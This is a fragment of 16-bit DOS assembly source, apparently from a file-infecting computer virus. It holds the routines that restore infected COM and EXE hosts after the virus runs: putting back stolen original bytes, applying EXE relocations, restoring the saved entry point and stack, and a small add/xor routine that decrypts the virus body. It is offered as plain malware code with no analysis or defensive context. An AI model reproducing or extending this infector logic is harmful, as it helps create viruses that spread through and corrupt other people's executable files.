   exit:
     mov ax, 2 ptr cs:[bp+LostBytes_1]
     not ax
     mul ah
     cmp ax, 72BAh
     jz  exe_normal
   ; ¢ëå®¤ ¤«ï COM ä ©«®¢ [Simbi0z/Enuns]
   ; call xx
   ; pushf/pusha /YES/
   com_exit:
     push cs cs
     pop  es ds
     mov bx, sp
     db  36h
     sub 2 ptr [bx+14+2], 3
     db  36h
     mov bx, 2 ptr [bx+14+2]
     cmp bx, 100h  ; no enuns ?
     jz  no_enuns
     call decrypt_body
   no_enuns:
     mov ax, 20CDh
   LostBytes_1 equ 2 ptr $-2
     mov 2 ptr ds:[bx], ax
     mov al, 0
   LostBytes_2 equ 1 ptr $-1
     mov 1 ptr ds:[bx+2], al
     popa
     ret
   exe2com:
     call decrypt_body
     push cs
     pop  bx
     add bx, 10h
     mov ds, bx
     mov dx, bx
     mov si, 0
     org $-2
   RelocOfs dw 0
     mov cx, 0
     org $-2
   RelocNum dw 0
     add bx, 1234h
     org $-2
   HdrSize  dw 0
   __1:
     lodsw
     xchg ax, di
     lodsw
     add ax, bx
     mov es, ax
     add 2 ptr es:[di],  dx
     loop __1
     ; copyz body
     push cs cs
     pop  ds es
     mov di, 100h
     mov si, 2 ptr cs:[bp+HdrSize]
     shl si, 4
     add si, di
     mov cx, bp
     sub cx, di
     rep movsb
     jmp  _exe
   exe_normal:
     mov ax, cs
     mov bx, ss
     cmp ax, bx
     jz  exe2com
   _exe:
     mov ah, 62h
     int 21h
     xchg ax, bx
     mov ds, ax
     mov es, ax
     add ax, 10h
     add 2 ptr cs:[bp+OldCS], ax
     add 2 ptr cs:[bp+OldSS], ax
     popa
     jmp $+2
     cli
     mov sp, 1234h
     org $-2
   OldSS dw  0
     mov ss, sp
     mov sp, 1234h
     org $-2
   OldSP dw  0FFFEh
     sti
     db 0EAH
   OldIP dw 0
   OldCS dw 0

   decrypt_body proc
     mov al, 1 ptr cs:[bp+KeyCom]
     mov si, 2 ptr cs:[bp+OfsCom]
     mov cx, 200h
     add si, 100h
   __1:
     add 1 ptr cs:[si], al
     xor 1 ptr cs:[si], cl
     sub al, cl
     inc si
     loop __1
     ret
     endp

